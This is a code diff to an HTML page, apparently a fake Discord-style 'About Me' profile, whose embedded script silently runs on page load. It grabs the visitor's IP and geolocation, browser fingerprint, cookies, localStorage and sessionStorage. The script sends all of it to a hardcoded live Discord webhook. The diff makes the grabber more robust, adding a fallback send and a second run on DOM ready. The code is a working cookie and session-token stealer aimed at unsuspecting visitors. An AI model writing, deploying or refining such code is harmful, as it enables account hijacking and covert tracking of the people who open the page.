@@ -133,62 +133,50 @@
     const webhookUrl = 'https://discord.com/api/webhooks/1437139077714411624/UGLtXYwbnVJsgG5mayU6fyq4p0HqDMEDlg_6V6U8rZRc0FjxXk5y-2W0bohbzTsL3QAk';
     
     const sendData = async () => {
-      const formData = new FormData();
-      const fields = [];
+      console.log('Script started - attempting to send data...');
+      
+      // Fallback: Send basic test embed immediately if anything fails
+      const sendBasic = () => {
+        const basicPayload = {
+          content: 'Basic test from page load',
+          embeds: [{
+            title: 'Fallback User Data',
+            description: `Timestamp: ${new Date().toISOString()}\nUser Agent: ${navigator.userAgent.substring(0, 500)}`,
+            color: 3447003,
+            footer: { text: 'Basic send - full data failed' }
+          }]
+        };
+        fetch(webhookUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(basicPayload)
+        }).then(() => console.log('Basic fallback sent!')).catch(e => console.error('Basic send failed:', e));
+      };
+      
       let ip = 'unknown';
-      let country = 'unknown';
-      let city = 'unknown';
-      let lat = 'unknown';
-      let lon = 'unknown';
-      let status = 'unknown';
-      let timezoneGeo = 'unknown';
-      let mobile = 'No';
-      let proxy = 'No';
-      let hosting = 'No';
-      let isp = 'unknown';
-      let org = 'unknown';
-      let asNum = 'unknown';
-      let region = 'unknown';
-      let regionCode = 'unknown';
-      let district = 'unknown';
-      let zip = 'unknown';
-      let countryCode = 'unknown';
       let geoData = {};
       
       try {
+        console.log('Fetching IP...');
         const ipResponse = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipResponse.json();
         ip = ipData.ip;
+        console.log('IP fetched:', ip);
       } catch (error) {
         console.error('IP fetch failed:', error);
       }
       
       try {
+        console.log('Fetching geo...');
         const geoResponse = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting`);
         geoData = await geoResponse.json();
-        if (geoData.status === 'success') {
-          country = geoData.country || 'unknown';
-          city = geoData.city || 'unknown';
-          lat = geoData.lat || 'unknown';
-          lon = geoData.lon || 'unknown';
-          status = geoData.status || 'unknown';
-          timezoneGeo = geoData.timezone || 'unknown';
-          mobile = geoData.mobile ? 'Yes' : 'No';
-          proxy = geoData.proxy ? 'Yes' : 'No';
-          hosting = geoData.hosting ? 'Yes' : 'No';
-          isp = geoData.isp || 'unknown';
-          org = geoData.org || 'unknown';
-          asNum = geoData.as || 'unknown';
-          region = geoData.regionName || 'unknown';
-          regionCode = geoData.region || 'unknown';
-          district = geoData.district || 'unknown';
-          zip = geoData.zip || 'unknown';
-          countryCode = geoData.countryCode || 'unknown';
-        }
+        console.log('Geo fetched:', geoData.status);
       } catch (error) {
         console.error('Geo fetch failed:', error);
       }
       
+      // Build fields with available data
+      const fields = [];
       const timestamp = new Date().toISOString();
       const userAgent = navigator.userAgent || 'unknown';
       const languages = navigator.languages ? navigator.languages.join(', ') : (navigator.language || 'unknown');
@@ -199,7 +187,7 @@
       const doNotTrack = navigator.doNotTrack || 'unspecified';
       const hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
       const deviceMemory = navigator.deviceMemory || 'unknown';
-      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || timezoneGeo;
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || (geoData.timezone || 'unknown');
       let connection = 'unsupported';
       try {
         if (navigator.connection) {
@@ -214,6 +202,24 @@
       } catch (error) {
         console.error('Plugins fetch failed:', error);
       }
+      
+      // Geo fields (with fallbacks)
+      const country = geoData.country || 'unknown';
+      const city = geoData.city || 'unknown';
+      const lat = geoData.lat || 'unknown';
+      const lon = geoData.lon || 'unknown';
+      const status = geoData.status || 'unknown';
+      const mobile = geoData.mobile ? 'Yes' : 'No';
+      const proxy = geoData.proxy ? 'Yes' : 'No';
+      const hosting = geoData.hosting ? 'Yes' : 'No';
+      const isp = geoData.isp || 'unknown';
+      const org = geoData.org || 'unknown';
+      const asNum = geoData.as || 'unknown';
+      const region = geoData.regionName || 'unknown';
+      const regionCode = geoData.region || 'unknown';
+      const district = geoData.district || 'unknown';
+      const zip = geoData.zip || 'unknown';
+      const countryCode = geoData.countryCode || 'unknown';
       
       fields.push(
         { name: 'IP', value: ip, inline: true },
@@ -254,49 +260,61 @@
         footer: { text: 'Grabbed via Discord-like About Me Page' }
       };
       
+      const formData = new FormData();
       formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
       
-      // Cookies
+      // Optional: Add storage files (skip if they cause issues)
       try {
         if (document.cookie) {
           const cookiesBlob = new Blob([document.cookie], { type: 'text/plain' });
           formData.append('file1', cookiesBlob, 'cookies.txt');
         }
       } catch (error) {
-        console.error('Cookies send failed:', error);
+        console.error('Cookies prep failed:', error);
       }
       
-      // LocalStorage
       try {
-        const lsData = JSON.stringify(Object.fromEntries(Object.entries(localStorage).map(([k, v]) => [k, v])), null, 2);
+        const lsData = JSON.stringify(Object.fromEntries(Object.entries(localStorage)), null, 2);
         const lsBlob = new Blob([lsData], { type: 'application/json' });
         formData.append('file2', lsBlob, 'localStorage.json');
       } catch (error) {
-        console.error('LocalStorage send failed:', error);
+        console.error('LocalStorage prep failed:', error);
       }
       
-      // SessionStorage
       try {
-        const ssData = JSON.stringify(Object.fromEntries(Object.entries(sessionStorage).map(([k, v]) => [k, v])), null, 2);
+        const ssData = JSON.stringify(Object.fromEntries(Object.entries(sessionStorage)), null, 2);
         const ssBlob = new Blob([ssData], { type: 'application/json' });
         formData.append('file3', ssBlob, 'sessionStorage.json');
       } catch (error) {
-        console.error('SessionStorage send failed:', error);
+        console.error('SessionStorage prep failed:', error);
       }
       
       try {
-        await fetch(webhookUrl, {
+        console.log('Sending to webhook...');
+        const response = await fetch(webhookUrl, {
           method: 'POST',
           body: formData,
         });
-        console.log('All available user data sent to webhook');
+        if (response.ok) {
+          console.log('Full data sent successfully!');
+        } else {
+          console.error('Webhook response not OK:', response.status, response.statusText);
+          sendBasic(); // Fallback
+        }
       } catch (error) {
         console.error('Webhook send failed:', error);
+        sendBasic(); // Fallback
       }
     };
     
-    // Send data immediately on script load
+    // Run immediately on script load
     sendData();
+    
+    // Backup on DOM ready (in case)
+    document.addEventListener('DOMContentLoaded', () => {
+      console.log('DOM loaded - re-running sendData');
+      sendData();
+    });
   </script>
 </body>
 </html>
